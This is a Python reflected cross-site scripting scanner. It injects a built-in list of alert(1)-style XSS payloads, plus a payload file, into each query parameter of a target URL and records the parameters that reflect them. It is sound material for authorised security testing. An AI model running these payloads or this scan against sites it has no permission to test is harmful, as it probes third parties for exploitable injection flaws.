import requests
import json
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import os
XSS_PAYLOAD_FILE = os.path.join(os.path.dirname(__file__), '..', 'Payloads', 'XSS_payload', 'robot-friendly', 'XSS-BruteLogic.txt')
ADVANCED_XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "\"><body onload=alert(1)>",
    "#<script>alert(1)</script>",
    "';alert(1);//",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<math><mtext></mtext><script>alert(1)</script></math>",
    "<img src=x onerror=confirm(1)>",
    "<details open ontoggle=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<video><source onerror=\"alert(1)\"></video>",
    "<object data='javascript:alert(1)'>",
    "<a href='javascript:alert(1)'>click</a>",
    "<body onpageshow=alert(1)>",
    "<img src=x onmouseover=alert(1)>",
    "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
    "<marquee onstart=alert(1)>",
    "<form><button formaction='javascript:alert(1)'>click</button></form>"
]

def load_payloads(filepath):
    with open(filepath, "r", encoding="utf-8") as f:
        file_payloads = [line.strip() for line in f if line.strip()]
    # Deduplicate and combine all payloads
    all_payloads = list(dict.fromkeys(file_payloads + ADVANCED_XSS_PAYLOADS))
    return all_payloads

def inject_payload(url, param, payload):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    query[param] = payload
    new_query = urlencode(query, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', new_query, ''))

def scan_xss(url):
    payloads = load_payloads(XSS_PAYLOAD_FILE)
    results = []
    print(f"[+] Starting XSS scan on {url}")

    parsed = urlparse(url)
    params = list(parse_qs(parsed.query).keys())

    if not params:
        print("[-] No query params found to test for XSS")
        return

    for param in params:
        for payload in payloads:
            test_url = inject_payload(url, param, payload)
            try:
                resp = requests.get(test_url, timeout=7)
                if payload in resp.text:
                    # Context-aware detection
                    if "<script" in resp.text or "onerror=" in resp.text or "onload=" in resp.text or "alert(1)" in resp.text:
                        print(f"[!] XSS likely exploitable in {param} with payload: {payload}")
                        results.append({"param": param, "payload": payload, "url": test_url, "context": "html/js"})
                    else:
                        print(f"[!] Possible reflected XSS in {param} with payload: {payload}")
                        results.append({"param": param, "payload": payload, "url": test_url, "context": "reflected"})
            except requests.exceptions.Timeout:
                print(f"[!] Timeout for {test_url}")
            except requests.exceptions.ConnectionError:
                print(f"[!] Connection error for {test_url}")
            except Exception as e:
                print(f"[!] Unexpected error: {e}")

    if results:
        with open("xss_results.json", "w") as f:
            json.dump(results, f, indent=2)
    else:
        print("[-] No XSS vulnerabilities detected.")
    print("[*] XSS scan complete.")